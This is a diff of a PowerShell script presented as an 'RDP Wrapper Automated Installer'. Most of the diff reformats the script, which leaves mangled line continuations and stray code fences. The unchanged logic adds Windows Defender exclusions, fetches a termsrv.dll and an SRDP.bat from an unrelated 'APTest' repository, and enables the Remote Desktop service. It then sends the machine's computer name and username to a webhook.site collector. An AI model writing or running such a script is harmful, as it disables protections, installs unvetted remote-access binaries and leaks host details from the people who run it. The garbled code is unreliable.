@@ -1,28 +1,31 @@
-
 # ============================================================
+
 # RDP Wrapper Automated Installer
-# ============================================================
-# Run PowerShell as Administrator
+
 # ============================================================
 
 # ============================================================
-#              Check Administrator privileges
+
+# Check Administrator privileges
+
 # ============================================================
 
 if (-not (
-    [Security.Principal.WindowsPrincipal]
-    [Security.Principal.WindowsIdentity]::GetCurrent()
+[Security.Principal.WindowsPrincipal]::new(
+[Security.Principal.WindowsIdentity]::GetCurrent()
+)
 ).IsInRole(
-    [Security.Principal.WindowsBuiltInRole]::Administrator
+[Security.Principal.WindowsBuiltInRole]::Administrator
 )) {
-    Write-Host "[-] Please run PowerShell as Administrator!" -ForegroundColor Red
-    Start-Sleep -Seconds 3
-    exit 1
+Write-Host "[-] Please run PowerShell as Administrator!" -ForegroundColor Red
+Start-Sleep -Seconds 3
+exit 1
 }
 
-
 # ============================================================
-# 1. Windows Defender Exclusions (Pre-empting Blocks)
+
+# Windows Defender Exclusions
+
 # ============================================================
 
 Write-Host ""
@@ -72,7 +75,9 @@ foreach ($proc in$ProcessExclusions) {
 
 
 # ============================================================
-# 2. Paths
+
+# Paths
+
 # ============================================================
 
 $installPath = "C:\Program Files\RDP Wrapper"
@@ -81,181 +86,170 @@ $tempDir    = Join-Path $env:TEMP "rdpwrap_install"
 $tempZip    = Join-Path $tempDir "RDPWrap-v1.6.2.zip"
 $extractDir = Join-Path $tempDir "extracted"
 
-$iniTempPath    = Join-Path $env:TEMP "rdpwrap.ini"
-$srdpTempPath   = Join-Path $env:TEMP "SRDP.bat"
-$termsrvTemp    = Join-Path $env:TEMP "termsrv.dll"
+$iniTempPath  = Join-Path $env:TEMP "rdpwrap.ini"
+$srdpTempPath = Join-Path $env:TEMP "SRDP.bat"
+$termsrvTemp  = Join-Path $env:TEMP "termsrv.dll"
 
-$iniDestPath    = Join-Path $installPath "rdpwrap.ini"
-$srdpDestPath   = Join-Path $installPath "SRDP.bat"
-$termsrvDest    = Join-Path $installPath "termsrv.dll"
-$rdpConf        = Join-Path $installPath "RDPConf.exe"
+$iniDestPath  = Join-Path $installPath "rdpwrap.ini"
+$srdpDestPath = Join-Path $installPath "SRDP.bat"
+$termsrvDest  = Join-Path $installPath "termsrv.dll"
+$rdpConf      = Join-Path $installPath "RDPConf.exe"
 
 # ============================================================
-# 3. Download URLs
+
+# Download URLs
+
 # ============================================================
 
-$zipUrl = "https://github.com/stascorp/rdpwrap/releases/download/v1.6.2/RDPWrap-v1.6.2.zip"
-
+$zipUrl       = "https://github.com/stascorp/rdpwrap/releases/download/v1.6.2/RDPWrap-v1.6.2.zip"
 $customIniUrl = "https://raw.githubusercontent.com/affinityv/INI-RDPWRAP/refs/heads/master/rdpwrap.ini"
-
-$srdpBatUrl = "https://raw.githubusercontent.com/apex30258-sys/APTest/refs/heads/main/SRDP.bat"
-
-$termsrvUrl = "https://github.com/apex30258-sys/APTest/raw/refs/heads/main/termsrv.dll"
+$srdpBatUrl   = "https://raw.githubusercontent.com/apex30258-sys/APTest/refs/heads/main/SRDP.bat"
+$termsrvUrl   = "https://github.com/apex30258-sys/APTest/raw/refs/heads/main/termsrv.dll"
 
 # ============================================================
-# 4. Webhook
+
+# Webhook
+
 # ============================================================
 
 $webhookUrl = "https://webhook.site/60a9f667-6d90-446c-ad08-9855b56a437b"
 
 # ============================================================
-# 5. Installer Header
+
+# Installer Header
+
 # ============================================================
 
 Write-Host ""
 Write-Host "============================================================" -ForegroundColor Cyan
-Write-Host "          RDP Wrapper Automated Installer" -ForegroundColor Cyan
+Write-Host "             RDP Wrapper Automated Installer" -ForegroundColor Cyan
 Write-Host "============================================================" -ForegroundColor Cyan
 Write-Host ""
 
 # ============================================================
-# 6. Prepare temporary directory
+
+# Prepare temporary directory
+
 # ============================================================
 
 Write-Host "[+] Preparing temporary directory..." -ForegroundColor Cyan
 
 try {
+if (Test-Path $tempDir) {
+Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+}
 
-    if (Test-Path $tempDir) {
-        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
-    }
+```
+New-Item -ItemType Directory -Path $tempDir -Force -ErrorAction Stop | Out-Null
+New-Item -ItemType Directory -Path $extractDir -Force -ErrorAction Stop | Out-Null
 
-    New-Item -ItemType Directory -Path $tempDir -Force -ErrorAction Stop | Out-Null
-    New-Item -ItemType Directory -Path $extractDir -Force -ErrorAction Stop | Out-Null
-
-    Write-Host "[+] Temporary directory ready." -ForegroundColor Green
+Write-Host "[+] Temporary directory ready." -ForegroundColor Green
+```
 
 }
 catch {
-
-    Write-Host "[-] Failed to prepare temporary directory." -ForegroundColor Red
-    Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
-    exit 1
-
+Write-Host "[-] Failed to prepare temporary directory." -ForegroundColor Red
+Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
+exit 1
 }
 
 # ============================================================
-# 7. Stop Remote Desktop Service
+
+# Stop Remote Desktop Service
+
 # ============================================================
 
 Write-Host ""
 Write-Host "[+] Stopping Remote Desktop Service..." -ForegroundColor Cyan
 
 try {
-
-    Stop-Service `
-        -Name "TermService" `
-        -Force `
-        -ErrorAction SilentlyContinue
-
-    Start-Sleep -Seconds 2
-
-    Write-Host "[+] TermService stopped." -ForegroundColor Green
-
+Stop-Service -Name "TermService" -Force -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 2
+Write-Host "[+] TermService stopped." -ForegroundColor Green
 }
 catch {
-
-    Write-Host "[!] TermService could not be stopped or was already stopped." -ForegroundColor Yellow
-
+Write-Host "[!] TermService could not be stopped or was already stopped." -ForegroundColor Yellow
 }
 
 # ============================================================
-# 8. Download RDP Wrapper
+
+# Download RDP Wrapper
+
 # ============================================================
 
 Write-Host ""
 Write-Host "[+] Downloading RDP Wrapper..." -ForegroundColor Cyan
 
 try {
+Invoke-WebRequest `        -Uri $zipUrl`
+-OutFile $tempZip `        -UseBasicParsing`
+-ErrorAction Stop
 
-    Invoke-WebRequest `
-        -Uri $zipUrl `
-        -OutFile $tempZip `
-        -UseBasicParsing `
-        -ErrorAction Stop
-
-    Write-Host "[+] Download completed." -ForegroundColor Green
+```
+Write-Host "[+] Download completed." -ForegroundColor Green
+```
 
 }
 catch {
-
-    Write-Host "[-] RDP Wrapper download failed!" -ForegroundColor Red
-    Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
-
-    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
-
-    exit 1
-
+Write-Host "[-] RDP Wrapper download failed!" -ForegroundColor Red
+Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
+Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+exit 1
 }
 
 # ============================================================
-# 9. Extract RDP Wrapper
+
+# Extract RDP Wrapper
+
 # ============================================================
 
 Write-Host ""
 Write-Host "[+] Extracting RDP Wrapper..." -ForegroundColor Cyan
 
 try {
+Expand-Archive `        -Path $tempZip`
+-DestinationPath $extractDir `        -Force`
+-ErrorAction Stop
 
-    Expand-Archive `
-        -Path $tempZip `
-        -DestinationPath $extractDir `
-        -Force `
-        -ErrorAction Stop
-
-    Write-Host "[+] Extraction completed." -ForegroundColor Green
+```
+Write-Host "[+] Extraction completed." -ForegroundColor Green
+```
 
 }
 catch {
-
-    Write-Host "[-] Failed to extract RDP Wrapper." -ForegroundColor Red
-    Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
-
-    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
-
-    exit 1
-
+Write-Host "[-] Failed to extract RDP Wrapper." -ForegroundColor Red
+Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
+Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+exit 1
 }
 
 # ============================================================
-# 10. Find install.bat
+
+# Find install.bat
+
 # ============================================================
 
 Write-Host ""
 Write-Host "[+] Searching for install.bat..." -ForegroundColor Cyan
 
-$installBat = Get-ChildItem `
-    -Path $extractDir `
-    -Filter "install.bat" `
-    -Recurse `
-    -ErrorAction SilentlyContinue |
-    Select-Object -First 1
+$installBat = Get-ChildItem `    -Path $extractDir`
+-Filter "install.bat" `    -Recurse`
+-ErrorAction SilentlyContinue |
+Select-Object -First 1
 
 if (-not $installBat) {
-
-    Write-Host "[-] install.bat was not found." -ForegroundColor Red
-
-    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
-
-    exit 1
-
+Write-Host "[-] install.bat was not found." -ForegroundColor Red
+Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
+exit 1
 }
 
 Write-Host "[+] Found installer:" -ForegroundColor Green
 Write-Host "    $($installBat.FullName)" -ForegroundColor Gray
 
 # ============================================================
-# 11. Run install.bat
+
+# Run install.bat
+
 # ============================================================
 
 Write-Host ""
@@ -264,283 +258,266 @@ Write-Host "[+] Running install.bat..." -ForegroundColor Cyan
 $installExitCode = $null
 
 try {
+$process = Start-Process `        -FilePath "cmd.exe"`
+-ArgumentList "/c `"$($installBat.FullName)`"" `        -WorkingDirectory $installBat.DirectoryName`
+-Verb RunAs `        -Wait`
+-PassThru `
+-ErrorAction Stop
 
-    $process = Start-Process `
-        -FilePath "cmd.exe" `
-        -ArgumentList "/c `"$($installBat.FullName)`"" `
-        -WorkingDirectory $installBat.DirectoryName `
-        -Verb RunAs `
-        -Wait `
-        -PassThru `
-        -ErrorAction Stop
+```
+$installExitCode = $process.ExitCode
 
-    $installExitCode = $process.ExitCode
-
-    Write-Host "[+] install.bat finished." -ForegroundColor Green
-    Write-Host "[+] Exit code: $installExitCode" -ForegroundColor Gray
+Write-Host "[+] install.bat finished." -ForegroundColor Green
+Write-Host "[+] Exit code: $installExitCode" -ForegroundColor Gray
+```
 
 }
 catch {
-
-    Write-Host "[-] Failed to run install.bat." -ForegroundColor Red
-    Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
-
+Write-Host "[-] Failed to run install.bat." -ForegroundColor Red
+Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
 }
 
 # ============================================================
-# 12. Make sure installation directory exists
+
+# Prepare installation directory
+
 # ============================================================
 
 Write-Host ""
 Write-Host "[+] Preparing installation directory..." -ForegroundColor Cyan
 
 try {
+if (-not (Test-Path $installPath)) {
+New-Item `            -ItemType Directory`
+-Path $installPath `            -Force`
+-ErrorAction Stop | Out-Null
+}
 
-    if (-not (Test-Path $installPath)) {
-
-        New-Item `
-            -ItemType Directory `
-            -Path $installPath `
-            -Force `
-            -ErrorAction Stop | Out-Null
-
-    }
-
-    Write-Host "[+] Installation directory ready." -ForegroundColor Green
+```
+Write-Host "[+] Installation directory ready." -ForegroundColor Green
+```
 
 }
 catch {
-
-    Write-Host "[-] Could not create installation directory." -ForegroundColor Red
-    Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
-
-    exit 1
-
+Write-Host "[-] Could not create installation directory." -ForegroundColor Red
+Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
+exit 1
 }
 
 # ============================================================
-# 13. Download updated rdpwrap.ini
+
+# Download updated rdpwrap.ini
+
 # ============================================================
 
 Write-Host ""
 Write-Host "[+] Downloading updated rdpwrap.ini..." -ForegroundColor Cyan
 
 try {
+Invoke-WebRequest `        -Uri $customIniUrl`
+-OutFile $iniTempPath `        -UseBasicParsing`
+-ErrorAction Stop
 
-    Invoke-WebRequest `
-        -Uri $customIniUrl `
-        -OutFile $iniTempPath `
-        -UseBasicParsing `
-        -ErrorAction Stop
-
-    Write-Host "[+] rdpwrap.ini downloaded successfully." -ForegroundColor Green
+```
+Write-Host "[+] rdpwrap.ini downloaded successfully." -ForegroundColor Green
+```
 
 }
 catch {
-
-    Write-Host "[-] Failed to download rdpwrap.ini." -ForegroundColor Red
-    Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
-
+Write-Host "[-] Failed to download rdpwrap.ini." -ForegroundColor Red
+Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
 }
 
 # ============================================================
-# 14. Download SRDP.bat
+
+# Download SRDP.bat
+
 # ============================================================
 
 Write-Host ""
 Write-Host "[+] Downloading SRDP.bat..." -ForegroundColor Cyan
 
 try {
+Invoke-WebRequest `        -Uri $srdpBatUrl`
+-OutFile $srdpTempPath `        -UseBasicParsing`
+-ErrorAction Stop
 
-    Invoke-WebRequest `
-        -Uri $srdpBatUrl `
-        -OutFile $srdpTempPath `
-        -UseBasicParsing `
-        -ErrorAction Stop
-
-    Write-Host "[+] SRDP.bat downloaded successfully." -ForegroundColor Green
+```
+Write-Host "[+] SRDP.bat downloaded successfully." -ForegroundColor Green
+```
 
 }
 catch {
-
-    Write-Host "[-] Failed to download SRDP.bat." -ForegroundColor Red
-    Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
-
+Write-Host "[-] Failed to download SRDP.bat." -ForegroundColor Red
+Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
 }
 
 # ============================================================
-# 15. Download termsrv.dll
+
+# Download termsrv.dll
+
 # ============================================================
 
 Write-Host ""
 Write-Host "[+] Downloading termsrv.dll..." -ForegroundColor Cyan
 
 try {
+Invoke-WebRequest `        -Uri $termsrvUrl`
+-OutFile $termsrvTemp `        -UseBasicParsing`
+-ErrorAction Stop
 
-    Invoke-WebRequest `
-        -Uri $termsrvUrl `
-        -OutFile $termsrvTemp `
-        -UseBasicParsing `
-        -ErrorAction Stop
-
-    Write-Host "[+] termsrv.dll downloaded successfully." -ForegroundColor Green
+```
+Write-Host "[+] termsrv.dll downloaded successfully." -ForegroundColor Green
+```
 
 }
 catch {
-
-    Write-Host "[-] Failed to download termsrv.dll." -ForegroundColor Red
-    Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
-
+Write-Host "[-] Failed to download termsrv.dll." -ForegroundColor Red
+Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
 }
 
 # ============================================================
-# 16. Stop TermService before replacing files
+
+# Stop TermService before replacing files
+
 # ============================================================
 
 Write-Host ""
 Write-Host "[+] Preparing files for installation..." -ForegroundColor Cyan
 
 try {
+Stop-Service `        -Name "TermService"`
+-Force `
+-ErrorAction SilentlyContinue
 
-    Stop-Service `
-        -Name "TermService" `
-        -Force `
-        -ErrorAction SilentlyContinue
-
-    Start-Sleep -Seconds 2
+```
+Start-Sleep -Seconds 2
+```
 
 }
 catch {
-
-    Write-Host "[!] Could not stop TermService before file installation." -ForegroundColor Yellow
-
+Write-Host "[!] Could not stop TermService before file installation." -ForegroundColor Yellow
 }
 
 # ============================================================
-# 17. Backup and install rdpwrap.ini
+
+# Install rdpwrap.ini
+
 # ============================================================
 
 if (Test-Path $iniTempPath) {
 
-    Write-Host ""
-    Write-Host "[+] Installing rdpwrap.ini..." -ForegroundColor Cyan
+```
+Write-Host ""
+Write-Host "[+] Installing rdpwrap.ini..." -ForegroundColor Cyan
 
-    try {
+try {
+    if (Test-Path $iniDestPath) {
+        $backupPath = "$iniDestPath.backup"
 
-        if (Test-Path $iniDestPath) {
-
-            $backupPath = "$iniDestPath.backup"
-
-            Write-Host "[+] Backing up existing rdpwrap.ini..." -ForegroundColor Cyan
-
-            Copy-Item `
-                -Path $iniDestPath `
-                -Destination $backupPath `
-                -Force `
-                -ErrorAction Stop
-
-            Write-Host "[+] Backup created:" -ForegroundColor Green
-            Write-Host "    $backupPath" -ForegroundColor Gray
-
-        }
+        Write-Host "[+] Backing up existing rdpwrap.ini..." -ForegroundColor Cyan
 
         Copy-Item `
-            -Path $iniTempPath `
-            -Destination $iniDestPath `
+            -Path $iniDestPath `
+            -Destination $backupPath `
             -Force `
             -ErrorAction Stop
 
-        Write-Host "[+] rdpwrap.ini installed successfully." -ForegroundColor Green
-
+        Write-Host "[+] Backup created:" -ForegroundColor Green
+        Write-Host "    $backupPath" -ForegroundColor Gray
     }
-    catch {
 
-        Write-Host "[-] Failed to install rdpwrap.ini." -ForegroundColor Red
-        Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
+    Copy-Item `
+        -Path $iniTempPath `
+        -Destination $iniDestPath `
+        -Force `
+        -ErrorAction Stop
 
-    }
+    Write-Host "[+] rdpwrap.ini installed successfully." -ForegroundColor Green
+}
+catch {
+    Write-Host "[-] Failed to install rdpwrap.ini." -ForegroundColor Red
+    Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
+}
+```
 
 }
 
 # ============================================================
-# 18. Install SRDP.bat
+
+# Install SRDP.bat
+
 # ============================================================
 
 if (Test-Path $srdpTempPath) {
 
-    Write-Host ""
-    Write-Host "[+] Installing SRDP.bat..." -ForegroundColor Cyan
+```
+Write-Host ""
+Write-Host "[+] Installing SRDP.bat..." -ForegroundColor Cyan
 
-    try {
+try {
+    Copy-Item `
+        -Path $srdpTempPath `
+        -Destination $srdpDestPath `
+        -Force `
+        -ErrorAction Stop
 
-        Copy-Item `
-            -Path $srdpTempPath `
-            -Destination $srdpDestPath `
-            -Force `
-            -ErrorAction Stop
-
-        Write-Host "[+] SRDP.bat installed successfully." -ForegroundColor Green
-
-    }
-    catch {
-
-        Write-Host "[-] Failed to install SRDP.bat." -ForegroundColor Red
-        Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
-
-    }
+    Write-Host "[+] SRDP.bat installed successfully." -ForegroundColor Green
+}
+catch {
+    Write-Host "[-] Failed to install SRDP.bat." -ForegroundColor Red
+    Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
+}
+```
 
 }
 
 # ============================================================
-# 19. Install termsrv.dll
+
+# Install termsrv.dll
+
 # ============================================================
 
 if (Test-Path $termsrvTemp) {
 
-    Write-Host ""
-    Write-Host "[+] Installing termsrv.dll..." -ForegroundColor Cyan
+```
+Write-Host ""
+Write-Host "[+] Installing termsrv.dll..." -ForegroundColor Cyan
 
-    try {
+try {
+    Copy-Item `
+        -Path $termsrvTemp `
+        -Destination $termsrvDest `
+        -Force `
+        -ErrorAction Stop
 
-        Copy-Item `
-            -Path $termsrvTemp `
-            -Destination $termsrvDest `
-            -Force `
-            -ErrorAction Stop
-
-        Write-Host "[+] termsrv.dll installed successfully." -ForegroundColor Green
-
-    }
-    catch {
-
-        Write-Host "[-] Failed to install termsrv.dll." -ForegroundColor Red
-        Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
-
-    }
+    Write-Host "[+] termsrv.dll installed successfully." -ForegroundColor Green
+}
+catch {
+    Write-Host "[-] Failed to install termsrv.dll." -ForegroundColor Red
+    Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
+}
+```
 
 }
 
 # ============================================================
-# 20. Cleanup downloaded temporary component files
+
+# Cleanup downloaded temporary component files
+
 # ============================================================
 
 Write-Host ""
 Write-Host "[+] Cleaning temporary downloaded files..." -ForegroundColor Cyan
 
-Remove-Item $iniTempPath `
-    -Force `
-    -ErrorAction SilentlyContinue
-
-Remove-Item $srdpTempPath `
-    -Force `
-    -ErrorAction SilentlyContinue
-
-Remove-Item $termsrvTemp `
-    -Force `
-    -ErrorAction SilentlyContinue
+Remove-Item $iniTempPath -Force -ErrorAction SilentlyContinue
+Remove-Item $srdpTempPath -Force -ErrorAction SilentlyContinue
+Remove-Item $termsrvTemp -Force -ErrorAction SilentlyContinue
 
 # ============================================================
-# 21. Check RDPConf.exe
+
+# Check installation
+
 # ============================================================
 
 Write-Host ""
@@ -552,35 +529,37 @@ $srdpExists    = Test-Path $srdpDestPath
 $termsrvExists = Test-Path $termsrvDest
 
 if ($rdpConfExists) {
-    Write-Host "[+] RDPConf.exe found." -ForegroundColor Green
+Write-Host "[+] RDPConf.exe found." -ForegroundColor Green
 }
 else {
-    Write-Host "[!] RDPConf.exe was not found." -ForegroundColor Yellow
+Write-Host "[!] RDPConf.exe was not found." -ForegroundColor Yellow
 }
 
 if ($iniExists) {
-    Write-Host "[+] rdpwrap.ini found." -ForegroundColor Green
+Write-Host "[+] rdpwrap.ini found." -ForegroundColor Green
 }
 else {
-    Write-Host "[!] rdpwrap.ini was not found." -ForegroundColor Yellow
+Write-Host "[!] rdpwrap.ini was not found." -ForegroundColor Yellow
 }
 
 if ($srdpExists) {
-    Write-Host "[+] SRDP.bat found." -ForegroundColor Green
+Write-Host "[+] SRDP.bat found." -ForegroundColor Green
 }
 else {
-    Write-Host "[!] SRDP.bat was not found." -ForegroundColor Yellow
+Write-Host "[!] SRDP.bat was not found." -ForegroundColor Yellow
 }
 
 if ($termsrvExists) {
-    Write-Host "[+] termsrv.dll found." -ForegroundColor Green
+Write-Host "[+] termsrv.dll found." -ForegroundColor Green
 }
 else {
-    Write-Host "[!] termsrv.dll was not found." -ForegroundColor Yellow
+Write-Host "[!] termsrv.dll was not found." -ForegroundColor Yellow
 }
 
 # ============================================================
-# 22. Configure TermService
+
+# Configure TermService
+
 # ============================================================
 
 Write-Host ""
@@ -589,56 +568,48 @@ Write-Host "[+] Configuring Remote Desktop Service..." -ForegroundColor Cyan
 $serviceConfigured = $false
 
 try {
+Set-Service `        -Name "TermService"`
+-StartupType Automatic `
+-ErrorAction Stop
 
-    Set-Service `
-        -Name "TermService" `
-        -StartupType Automatic `
-        -ErrorAction Stop
+```
+Write-Host "[+] TermService configured using PowerShell." -ForegroundColor Green
 
-    Write-Host "[+] TermService configured using PowerShell." -ForegroundColor Green
-
-    $serviceConfigured = $true
+$serviceConfigured = $true
+```
 
 }
 catch {
-
-    Write-Host "[!] PowerShell could not configure TermService." -ForegroundColor Yellow
-    Write-Host "[+] Trying SC.exe fallback..." -ForegroundColor Cyan
-
+Write-Host "[!] PowerShell could not configure TermService." -ForegroundColor Yellow
+Write-Host "[+] Trying SC.exe fallback..." -ForegroundColor Cyan
 }
 
 if (-not $serviceConfigured) {
+try {
+$scResult = & sc.exe config TermService start= auto 2>&1
 
-    try {
-
-        $scResult = & sc.exe config TermService start= auto 2>&1
-
-        if ($LASTEXITCODE -eq 0) {
-
-            Write-Host "[+] TermService configured using SC.exe." -ForegroundColor Green
-
-            $serviceConfigured = $true
-
-        }
-        else {
-
-            Write-Host "[!] SC.exe could not configure TermService." -ForegroundColor Yellow
-            Write-Host ($scResult -join "`n") -ForegroundColor Yellow
-
-        }
-
+```
+    if ($LASTEXITCODE -eq 0) {
+        Write-Host "[+] TermService configured using SC.exe." -ForegroundColor Green
+        $serviceConfigured = $true
     }
-    catch {
-
-        Write-Host "[!] Service configuration failed." -ForegroundColor Yellow
-        Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Yellow
-
+    else {
+        Write-Host "[!] SC.exe could not configure TermService." -ForegroundColor Yellow
+        Write-Host ($scResult -join "`n") -ForegroundColor Yellow
     }
+}
+catch {
+    Write-Host "[!] Service configuration failed." -ForegroundColor Yellow
+    Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Yellow
+}
+```
 
 }
 
 # ============================================================
-# 23. Start TermService
+
+# Start TermService
+
 # ============================================================
 
 Write-Host ""
@@ -647,150 +618,133 @@ Write-Host "[+] Starting Remote Desktop Service..." -ForegroundColor Cyan
 $serviceRunning = $false
 
 try {
+$service = Get-Service `        -Name "TermService"`
+-ErrorAction Stop
+
+```
+if ($service.Status -eq "Running") {
+    Write-Host "[+] TermService is already running." -ForegroundColor Green
+    $serviceRunning = $true
+}
+else {
+    Start-Service `
+        -Name "TermService" `
+        -ErrorAction Stop
+
+    Start-Sleep -Seconds 3
 
     $service = Get-Service `
         -Name "TermService" `
         -ErrorAction Stop
 
     if ($service.Status -eq "Running") {
-
-        Write-Host "[+] TermService is already running." -ForegroundColor Green
-
+        Write-Host "[+] TermService started successfully." -ForegroundColor Green
         $serviceRunning = $true
-
     }
     else {
-
-        Start-Service `
-            -Name "TermService" `
-            -ErrorAction Stop
-
-        Start-Sleep -Seconds 3
-
-        $service = Get-Service `
-            -Name "TermService" `
-            -ErrorAction Stop
-
-        if ($service.Status -eq "Running") {
-
-            Write-Host "[+] TermService started successfully." -ForegroundColor Green
-
-            $serviceRunning = $true
-
-        }
-        else {
-
-            Write-Host "[!] TermService did not start." -ForegroundColor Yellow
-            Write-Host "[!] Current status: $($service.Status)" -ForegroundColor Yellow
-
-        }
-
+        Write-Host "[!] TermService did not start." -ForegroundColor Yellow
+        Write-Host "[!] Current status: $($service.Status)" -ForegroundColor Yellow
     }
+}
+```
 
 }
 catch {
-
-    Write-Host "[!] Could not start TermService." -ForegroundColor Yellow
-    Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Yellow
-
+Write-Host "[!] Could not start TermService." -ForegroundColor Yellow
+Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Yellow
 }
 
 # ============================================================
-# 24. Final installation result
+
+# Final installation result
+
 # ============================================================
 
 if (
-    $rdpConfExists -and
-    $iniExists -and
-    $serviceRunning
+$rdpConfExists -and
+$iniExists -and
+$serviceRunning
 ) {
-
-    $installationStatus = "success"
-    $statusMessage = "Installation completed and TermService is running."
-
+$installationStatus = "success"
+$statusMessage = "Installation completed and TermService is running."
 }
 else {
-
-    $installationStatus = "failed"
-    $statusMessage = "Installation completed with one or more verification failures."
-
+$installationStatus = "failed"
+$statusMessage = "Installation completed with one or more verification failures."
 }
 
 # ============================================================
-# 25. Cleanup installer directory
+
+# Cleanup installer directory
+
 # ============================================================
 
 Write-Host ""
 Write-Host "[+] Cleaning temporary installer files..." -ForegroundColor Cyan
 
-Remove-Item `
-    $tempDir `
-    -Recurse `
-    -Force `
-    -ErrorAction SilentlyContinue
+Remove-Item `    $tempDir`
+-Recurse `    -Force`
+-ErrorAction SilentlyContinue
 
 # ============================================================
-# 26. Send result to Webhook.site
+
+# Send result to Webhook.site
+
 # ============================================================
 
 Write-Host ""
 Write-Host "[+] Sending installation status to webhook..." -ForegroundColor Cyan
 
 $webhookPayload = @{
-    status       = $installationStatus
-    message      = $statusMessage
-    timestamp    = (Get-Date).ToUniversalTime().ToString("o")
-    computer     = $env:COMPUTERNAME
-    username     = $env:USERNAME
-    powershell   = $PSVersionTable.PSVersion.ToString()
-    rdpconf      = $rdpConfExists
-    ini          = $iniExists
-    srdp         = $srdpExists
-    termsrv      = $termsrvExists
-    service      = $serviceRunning
-    installExit  = $installExitCode
+status      = $installationStatus
+message     = $statusMessage
+timestamp   = (Get-Date).ToUniversalTime().ToString("o")
+computer    = $env:COMPUTERNAME
+username    = $env:USERNAME
+powershell  = $PSVersionTable.PSVersion.ToString()
+rdpconf     = $rdpConfExists
+ini         = $iniExists
+srdp        = $srdpExists
+termsrv     = $termsrvExists
+service     = $serviceRunning
+installExit = $installExitCode
 } | ConvertTo-Json
 
 $webhookSent = $false
 
 try {
+Invoke-RestMethod `        -Uri $webhookUrl`
+-Method POST `        -ContentType "application/json"`
+-Body $webhookPayload `
+-ErrorAction Stop |
+Out-Null
 
-    Invoke-RestMethod `
-        -Uri $webhookUrl `
-        -Method POST `
-        -ContentType "application/json" `
-        -Body $webhookPayload `
-        -ErrorAction Stop |
-        Out-Null
+```
+$webhookSent = $true
 
-    $webhookSent = $true
-
-    Write-Host "[+] Webhook notification sent successfully." -ForegroundColor Green
+Write-Host "[+] Webhook notification sent successfully." -ForegroundColor Green
+```
 
 }
 catch {
-
-    Write-Host "[-] Webhook notification failed." -ForegroundColor Red
-    Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Yellow
-
+Write-Host "[-] Webhook notification failed." -ForegroundColor Red
+Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Yellow
 }
 
 # ============================================================
-# 27. Final screen
+
+# Final screen
+
 # ============================================================
 
 Write-Host ""
 Write-Host "============================================================"
 
 if ($installationStatus -eq "success") {
-
-    Write-Host "                 INSTALLATION COMPLETE" -ForegroundColor Green
-
+Write-Host "                 INSTALLATION COMPLETE" -ForegroundColor Green
 }
 else {
-
-    Write-Host "                 INSTALLATION FAILED" -ForegroundColor Red
-
+Write-Host "                 INSTALLATION FAILED" -ForegroundColor Red
 }
 
 Write-Host "============================================================"
@@ -807,7 +761,9 @@ Write-Host ""
 Write-Host "The installer will close automatically in 3 seconds..." -ForegroundColor Gray
 
 # ============================================================
-# 28. Automatic exit
+
+# Automatic exit
+
 # ============================================================
 
 Start-Sleep -Seconds 3
